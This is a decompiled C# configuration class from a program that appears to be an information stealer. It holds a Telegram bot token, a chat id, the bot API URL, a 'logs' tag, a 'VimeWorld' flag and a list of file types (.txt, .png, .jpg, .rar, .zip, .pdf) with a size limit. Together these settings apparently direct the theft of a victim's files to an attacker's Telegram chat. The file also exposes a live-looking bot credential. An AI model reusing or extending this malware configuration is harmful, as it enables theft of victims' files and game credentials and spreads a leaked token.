﻿using System;

namespace SHARP
{
	// Token: 0x0200002B RID: 43
	internal class Config
	{
		// Token: 0x04000067 RID: 103
		public static string TextMessage = "";

		// Token: 0x04000068 RID: 104
		public static readonly bool VimeWorld = true;

		// Token: 0x04000069 RID: 105
		public static string zipPass = null;

		// Token: 0x0400006A RID: 106
		public static string teg = "logs";

		// Token: 0x0400006B RID: 107
		public static int year = 2024;

		// Token: 0x0400006C RID: 108
		public static int month = 8;

		// Token: 0x0400006D RID: 109
		public static int day = 25;

		// Token: 0x0400006E RID: 110
		public static string token = "7479180130:AAGjVOenh8BEp4czRcUtZiQRy9GNjS9ibZA";

		// Token: 0x0400006F RID: 111
		public static long id = 5098251556L;

		// Token: 0x04000070 RID: 112
		public static string key = "Ql9.9e";

		// Token: 0x04000071 RID: 113
		public static string[] extensions = new string[]
		{
			".txt",
			".png",
			".jpg",
			".svc",
			".rar",
			".zip",
			".pdf"
		};

		// Token: 0x04000072 RID: 114
		public static int sizefile = 5500000;

		// Token: 0x04000073 RID: 115
		public static string ApiUrl = "https://api.telegram.org/bot";

		// Token: 0x04000074 RID: 116
		public static string ids = "5098251556";
	}
}
